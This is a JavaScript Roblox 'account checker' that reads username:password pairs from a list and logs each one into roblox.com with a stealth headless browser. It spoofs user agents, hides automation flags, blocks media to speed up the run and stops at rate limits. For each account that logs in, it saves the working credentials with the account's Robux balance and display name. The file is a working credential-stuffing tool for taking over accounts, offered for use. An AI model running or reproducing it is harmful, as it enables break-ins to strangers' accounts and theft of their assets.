import { chromium } from 'playwright-extra';
import stealth from 'puppeteer-extra-plugin-stealth';
import chalk from "chalk";
import gradient from "gradient-string";
import dayjs from "dayjs";
import fs from "fs";
import axios from "axios";

chromium.use(stealth());

function displayBanner() {
    console.clear();
    const seaBlue = gradient(['#00FFFF', '#0080FF', '#000080']);
    console.log(seaBlue(`
    ██████╗  ██████╗ ██████╗ ██╗      ██████╗ ██╗  ██╗
    ██╔══██╗██╔═══██╗██╔══██╗██║     ██╔═══██╗╚██╗██╔╝
    ██████╔╝██║   ██║██████╔╝██║     ██║   ██║ ╚███╔╝ 
    ██╔══██╗██║   ██║██╔══██╗██║     ██║   ██║ ██╔██╗ 
    ██║  ██║╚██████╔╝██████╔╝███████╗╚██████╔╝██╔╝ ██╗
    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝
    ROBLOX CHECKER - Deep Ocean Identity
    By Paizutempest | Capsolver PoW Active
    `));
}

const log = {
    info: (msg) => console.log(`${chalk.cyan('ℹ')} [${dayjs().format('HH:mm:ss')}] ${msg}`),
    success: (msg) => console.log(`${chalk.green('✔')} [${dayjs().format('HH:mm:ss')}] ${msg}`),
    warn: (msg) => console.log(`${chalk.yellow('⚠')} [${dayjs().format('HH:mm:ss')}] ${msg}`),
    error: (msg) => console.log(`${chalk.red('✖')} [${dayjs().format('HH:mm:ss')}] ${msg}`),
    process: (msg) => console.log(`${chalk.blue('⚙')} [${dayjs().format('HH:mm:ss')}] ${chalk.italic(msg)}...`)
};

function getDeepIdentity() {
    const devices = [
        { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36', platform: 'Windows' },
        { ua: 'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36', platform: 'Linux armv8l' },
        { ua: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1', platform: 'iPhone' }
    ];
    const pick = devices[Math.floor(Math.random() * devices.length)];
    const screens = [{ width: 1920, height: 1080 }, { width: 1366, height: 768 }];
    return { ...pick, screen: screens[Math.floor(Math.random() * screens.length)] };
}

async function runRobloxCheck() {
    const filePath = 'list.txt';
    if (!fs.existsSync(filePath)) {
        log.error("File list.txt tidak ditemukan!");
        return;
    }

    let accounts = fs.readFileSync(filePath, 'utf8').split('\n').filter(line => line.trim() !== '');
    const id = getDeepIdentity();
    const browser = await chromium.launch({ 
        headless: true, 
        args: ['--disable-blink-features=AutomationControlled', '--no-sandbox', '--disable-gpu', '--mute-audio'] 
    });

    const context = await browser.newContext({ userAgent: id.ua, viewport: id.screen });

    while (accounts.length > 0) {
        const entry = accounts[0];
        const [rawUser, password] = entry.split(':');
        const username = rawUser.split('@')[0];
        
        const page = await context.newPage();

        // Anti-Images & Ads
        await page.route('**/*', (route) => {
            const type = route.request().resourceType();
            if (['image', 'media', 'font'].includes(type)) route.abort();
            else route.continue();
        });

        // Intercept PoW
        page.on('response', async (response) => {
            if (response.url().includes('pow-puzzle')) {
                const data = await response.json();
                
            }
        });

        log.info(`Checking: ${chalk.yellow(username)}`);

        try {
            await page.goto('https://www.roblox.com/id/login', { waitUntil: 'networkidle' });
            await page.fill('#login-username', username);
            await page.fill('#login-password', password);
            await page.click('#login-button');

            await page.waitForTimeout(5000);

            // 1. Check Error
            const errorElement = page.locator('#login-form-error');
            if (await errorElement.isVisible()) {
                const rawError = await errorElement.innerText();
                if (rawError.includes("terlalu banyak") || rawError.includes("Too many attempts")) {
                    log.error(`IP LIMIT - ${rawError}`);
                    break;
                } else {
                    log.error(`INVALID - ${rawError}`);
                }
            }

            // 2. Check Lock
            else if (await page.isVisible('.modal-dialog:has-text("Notifikasi Keamanan")')) {
                log.warn(`[SECURITY_CHECK] - Account Locked.`);
                saveResult(username, password, 'Security Check', '0');
            }

            // 3. Success
            else if (page.url().includes('/home')) {
                // FIX: Menunggu selector Robux benar-benar muncul dan tidak kosong
                await page.waitForSelector('#nav-robux-amount', { state: 'attached', timeout: 15000 });
                
                // Ambil nilai Robux dengan handle jika delay muat
                const robux = await page.$eval('#nav-robux-amount', el => el.innerText.trim() || "0");
                const displayName = await page.$eval('.age-bracket-label-username', el => el.innerText.trim() || "Unknown");
                log.success(`SUCCESS | Name: ${displayName} | Robux: ${robux}`);
                saveResult(username, password, displayName, robux);
            }

        } catch (err) {
            log.error(`Error: ${err.message}`);
        } finally {
            await page.close();
            // Hapus akun yang sudah dicek dari list
            accounts.shift();
            fs.writeFileSync(filePath, accounts.join('\n'));
        }
    }
    await browser.close();
}

function saveResult(user, pass, name, robux) {
    const data = `${user}:${pass} | Name: ${name} | Robux: ${robux} | Date: ${dayjs().format('YYYY-MM-DD HH:mm')}\n`;
    fs.appendFileSync('roblox_results.txt', data);
}

displayBanner();
runRobloxCheck();